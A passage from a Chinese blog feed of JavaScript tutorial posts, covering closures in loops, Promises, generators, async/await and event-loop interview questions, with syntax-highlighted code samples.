<span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>       <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 1s之后输出10个10</span></code></pre><p>setTimeout放入任务队列中，主线程执行完毕之后，等到回调函数执行时，用词法作用域捕获的 i 就只能是 10</p><p><strong>解法1：采用立即执行函数，创建函数作用域；</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><strong>解法2：let  创建块级作用域，可以将块级作用域理解为: 使用let和const声明的变量, 只在当前大括号内生效 </strong> </p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><strong>解法3：暂存i</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> index <span class="token operator">=</span> i    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS异步编程，Promise</title>
      <link href="2020/03/08/JavaScript-JS%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%EF%BC%8CPromise/"/>
      <url>2020/03/08/JavaScript-JS%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%EF%BC%8CPromise/</url>
      
        <content type="html"><![CDATA[<ul><li>promise</li><li>Generator</li><li>async和await</li><li>宏任务，微任务，事件循环</li><li>面试题精选</li><li>浏览器与node的事件循环</li></ul><h2 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h2><p>首先想一下，怎么规定函数的执行顺序，通过回调的方式：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">A</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I am A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//调用该函数</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I am B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">A</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先执行A后执行B，当需要执行ABCDEFG时，就会造成回调地狱</span></code></pre><p>回调地狱“也叫”回调金字塔“，我们平时写代码的时候 js如果异步 回调是不可避免的  例如 ajax不断的进行异步请求数据 回调方法里还要对数据进行处理，继续回调…形成回调地狱  这会使得我们的代码可读性变差，出现问题 不好调试 也会导致性能下降 </p><p><strong>Promise：同步代码解决异步编程</strong></p><ul><li>是一个构造函数，用来传递异步操作消息，链式调用，避免层层嵌套的回调函数。</li><li>promise接收两个函数参数，resolve和reject，分别表示异步操作执行成功后的回调和失败的回调</li><li>promise在声明的时候就已经执行了</li><li>有三种状态：pending进行中、resolve已完成、rejected已失败,</li><li>这些状态只能由pending -&gt; resolved, pending -&gt; rejected,一旦promise实例发生改变，就不能在变了，任何时候都能得到这个结果</li><li>promise对象的then方法会返回一个全新的promise对象</li><li>前面then方法中的回调函数的返回值会作为后面then方法回调的参数</li><li>如果回调中返回的是Promise，那后面的then方法的回调会等待它的结果</li><li>promise.reslove()可以快速创建一个Promise对象</li></ul><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//立刻执行</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//Promise.then是微任务</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//输出1,2,4,3,5</span><span class="token comment" spellcheck="true">//resolve可以接收参数</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 拿点外卖为例，点外卖后可能会成功派送也可能会延迟，无论如何都会有个结果</span>funtion <span class="token function">dianwaimai</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>reslove<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">cooking</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token operator">===</span><span class="token string">"做好了"</span><span class="token punctuation">)</span> <span class="token function">reslove</span><span class="token punctuation">(</span><span class="token string">"正在派送"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"还没做好"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">cooking</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.5</span> <span class="token operator">?</span> <span class="token string">'菜烧好了'</span> <span class="token punctuation">:</span> <span class="token string">'菜烧糊了'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//执行</span><span class="token function">dianwaimai</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res<span class="token operator">=</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>res<span class="token operator">=</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="Promise静态方法"><a href="#Promise静态方法" class="headerlink" title="Promise静态方法"></a>Promise静态方法</h3><ul><li>Promise.reslove</li><li>Promise.reject</li></ul><p><strong>这两种方法均会创建Promise对象</strong></p><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> value <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// foo</span>Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'rejected'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Error: rejected</span><span class="token comment" spellcheck="true">//    at &lt;anonymous>:1:16</span></code></pre><h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><ul><li>Generator 的中文名称是生成器，</li><li>通过<code>function*</code>来定义的函数称之为“生成器函数”（generator function），它的特点是可以中断函数的执行，每次执行<code>yield</code>语句之后，函数即暂停执行，直到调用返回的生成器对象的<code>next()</code>函数它才会继续执行。</li><li>也就是说Generator 函数是一个状态机，封装了多个内部状态。执行 Generator 函数返回一个遍历器对象（一个指向内部状态的指针对象），调用遍历器对象的next方法，使得指针移向下一个状态。 </li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">yield</span> i    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//返回一个遍历器对象</span>obj<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//Object {value: 0, done: false}</span>obj<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//Object {value: 1, done: false}</span>obj<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//Object {value: 2, done: false}</span><span class="token operator">...</span>obj<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//Object {value: 9 done: false}</span>obj<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//Object {value: undefined, done: true}</span><span class="token comment" spellcheck="true">//计数</span>funtion<span class="token operator">*</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> c<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">yield</span> c<span class="token operator">++</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> countNum <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>countNum<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//next方法可以传值</span>funtion<span class="token operator">*</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> c<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">let</span> status <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span><span class="token punctuation">{</span>        status <span class="token operator">=</span> <span class="token keyword">yield</span> c<span class="token operator">++</span> <span class="token comment" spellcheck="true">//还可以接收值，先接收值然后就暂停，赋值在后面</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> countNum <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>countNum<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>countNum<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>countNum<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//停止</span></code></pre><h2 id="async和await"><a href="#async和await" class="headerlink" title="async和await"></a>async和await</h2><p>ES2017提供了<code>async</code>函数，使得异步操作变得更加方便。<code>async</code>函数就是<code>Generator</code>函数的语法糖。<br> <code>async</code>函数就是将<code>Generator</code>函数的星号（<code>*</code>）替换成<code>async</code>，将<code>yield</code>替换成<code>await</code>，仅此而已。<br> 进一步说，<code>async</code>函数完全可以看作多个异步操作，包装成的一个<code>Promise</code>对象，而<code>await</code>命令就是内部<code>then</code>命令的语法糖。 </p><ul><li>async函数返回的就是一个Promise对象，所接收的值就是函数return的值</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">'hello world'</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li>在async函数内部可以使用await命令，表示等待一个异步函数的返回。</li><li>每遇到await关键字时，Promise都会停下，一直到运行结束。</li><li>await后面跟着的是一个Promise对象，如果不是的话会调用Promise.resolve方法将其转为一个resolve的Promise对象</li><li>Promise.resolve(x)相当于new Promise(resolve=&gt;resolve(x))的简写</li><li>async/await相比于Generator内置了执行器，可以自动执行，并且async返回的是Promise</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//首先定义一个方法</span><span class="token keyword">function</span> <span class="token function">fetchUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>reslove<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//... reslove()</span>        <span class="token comment" spellcheck="true">//... reject()</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="宏任务，微任务，事件循环"><a href="#宏任务，微任务，事件循环" class="headerlink" title="宏任务，微任务，事件循环"></a>宏任务，微任务，事件循环</h2><p> <strong>宏任务(macrotask)：</strong>：</p><p>script(整体代码)、setTimeout、setInterval、UI 渲染、 I/O、postMessage、 MessageChannel、setImmediate(Node.js 环境)</p><p><strong>微任务(microtask)：</strong></p><p>Promise、 MutaionObserver、process.nextTick(Node.js环境</p><p> <strong>事件循环(Event Loop)</strong>:   指主线程重复从任务队列中取任务、执行的过程 </p><ul><li>选择最先进入队列的宏任务(通常是<code>script</code>整体代码)，如果有则执行</li><li>检查是否存在 Microtask，如果存在则不停的执行，直至清空 microtask 队列</li><li>更新render(每一次事件循环，浏览器都可能会去更新渲染)</li><li>重复以上步骤</li><li><a href="http://lynnelv.github.io/img/article/event-loop/ma(i" target="_blank" rel="noopener">图示</a>crotask.png)</li></ul><h2 id="面试题精选"><a href="#面试题精选" class="headerlink" title="面试题精选"></a>面试题精选</h2><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//script start</span><span class="token comment" spellcheck="true">//script end</span><span class="token comment" spellcheck="true">//promise1</span><span class="token comment" spellcheck="true">//promise2</span><span class="token comment" spellcheck="true">//setTimeout</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//2</span>    <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//6 放入了微队列  </span><span class="token punctuation">}</span>                                <span class="token comment" spellcheck="true">//    相当于async2.then(()=>{console.log('async1 end')})</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//3</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//1</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//8</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//4</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//7   放入了微队列</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//5</span><span class="token comment" spellcheck="true">//await是一个让出线程的标志。await后面的表达式会先执行一遍，将await 后面的代码加入到microtask中，然后就会跳出整个async函数来执行后面的代码</span>script startasync1 startasync2promise1script endasync1 endpromise2setTimeout</code></pre><blockquote><p>1.首先，事件循环从宏任务(macrotask)队列开始，这个时候，宏任务队列中，只有一个script(整体代码)任务；当遇到任务源(task source)时，则会先分发任务到对应的任务队列中去。</p></blockquote><blockquote><p>2.然后我们看到首先定义了两个async函数，接着往下看，然后遇到了 console 语句，直接输出 script start。输出之后，script 任务继续往下执行，遇到 setTimeout，其作为一个宏任务源，则会先将其任务分发到对应的队列中</p></blockquote><blockquote><p>3.script 任务继续往下执行，执行了async1()函数，前面讲过async函数中在await之前的代码是立即执行的，所以会立即输出async1 start。<br> 遇到了await时，会将await后面的表达式执行一遍，所以就紧接着输出async2，然后将await后面的代码也就是console.log(‘async1 end’)加入到microtask中的Promise队列中，接着跳出async1函数来执行后面的代码</p></blockquote><blockquote><p>4.script任务继续往下执行，遇到Promise实例。由于Promise中的函数是立即执行的，而后续的 .then 则会被分发到 microtask 的 Promise 队列中去。所以会先输出 promise1，然后执行 resolve，将 promise2 分配到对应队列</p></blockquote><blockquote><p>5.script任务继续往下执行，最后只有一句输出了 script end，至此，全局任务就执行完毕了。<br> 根据上述，每次执行完一个宏任务之后，会去检查是否存在 Microtasks；如果有，则执行 Microtasks 直至清空 Microtask Queue。<br> 因而在script任务执行完毕之后，开始查找清空微任务队列。此时，微任务中， Promise 队列有的两个任务async1 end和promise2，因此按先后顺序输出 async1 end，promise2。当所有的 Microtasks 执行完毕之后，表示第一轮的循环就结束了</p></blockquote><blockquote><p>6.第二轮循环依旧从宏任务队列开始。此时宏任务中只有一个 setTimeout，取出直接输出即可，至此整个流程结束</p></blockquote><p>面试官问：</p><pre class=" language-js"><code class="language-js"><span class="token function">setTimeout（</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span>）<span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token class-name">Promise</span>（resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>）<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//为什么你说先运行宏任务，不直接运行setTimeout呢？</span><span class="token comment" spellcheck="true">//因为后面如果有console.log("3")时，肯定会先执行3，setTimeout是放到宏任务队列里的。</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 1</span><span class="token comment" spellcheck="true">// then里面只要不是函数就不会传递，2是值，Promise.resolve(3)是Promise对象</span><span class="token comment" spellcheck="true">// console.log 是函数</span></code></pre><h3 id="手写代码"><a href="#手写代码" class="headerlink" title="手写代码"></a>手写代码</h3><ul><li>Promise</li><li>promise.all</li><li>promise.race</li><li>promise.resolve</li><li><p>Promise 封装 AJAX</p></li><li><p><a href="https://jinjingxuan.github.io/2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">手写代码整理</a></p></li></ul><h3 id="看代码说答案"><a href="#看代码说答案" class="headerlink" title="看代码说答案"></a>看代码说答案</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 原代码</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">'hello '</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token string">'lagou '</span>    <span class="token function">setTimeout</span><span class="token 